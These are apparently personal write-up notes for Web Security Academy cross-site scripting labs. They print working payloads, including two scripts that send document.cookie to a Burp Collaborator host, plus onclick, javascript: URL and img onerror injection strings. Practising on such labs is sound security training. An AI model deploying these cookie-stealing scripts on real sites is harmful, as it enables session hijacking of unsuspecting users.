# Lab: Exploiting cross-site scripting to steal cookies

Should comment an HTTP request script injection to your burp collaborator:
```javascript
<script>
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", 'https://mtjd42yn0x885vau3go892l4wv2oqd.burpcollaborator.net/?'+document.cookie, false ); // false for synchronous request
xmlHttp.send( null );
</script>
```
Then we will see the user's session cookie and we can just call my account with the user's cookie and solve the challenge.

Atlernative script is:
```html
<script>
    fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
</script>
```

# Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

User intercept to capture a
Transfer this URL to the URL encoded and send the comment with the repeatrer
```http
https://acf81f301e4b67d580700be400e800d3.web-security-academy.net/?&apos;-alert(1)-&apos;
```
To get:
```http
https%3A%2F%2Facf81f301e4b67d580700be400e800d3.web-security-academy.net%2F%3f%26%61%70%6f%73%3b%2d%61%6c%65%72%74%28%31%29%2d%26%61%70%6f%73%3b
```
To get the packet:
```http
POST /post/comment HTTP/1.1
Host: ac161f701f431094801ba0b10084008a.web-security-academy.net
...
csrf=sPboZoDOXp9ocZN9gfV0LKueKLwMSoCC&postId=2&comment=aaaa&name=ddddd&email=asdsad%40sadfgsdf.com&website=https%3A%2F%2Facf81f301e4b67d580700be400e800d3.web-security-academy.net%2F%3f%26%61%70%6f%73%3b%2d%61%6c%65%72%74%28%31%29%2d%26%61%70%6f%73%3b
```



# DOM XSS in jQuery anchor href attribute sink using location.search source
Browse to 'feedback' page, change the url and click back
```
https://acb21f0a1ef32c1381a8b596007000af.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

# Stored DOM XSS
In blog post there was a stored XSS, later proccessed by js.
The vulnerable code:
```javascript
commentBodyPElement.innerHTML = escapeHTML(comment.body); 
...
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```

Our comment in the blog:
```html
<spam>
<img src='1' onerror="alert(1)">
```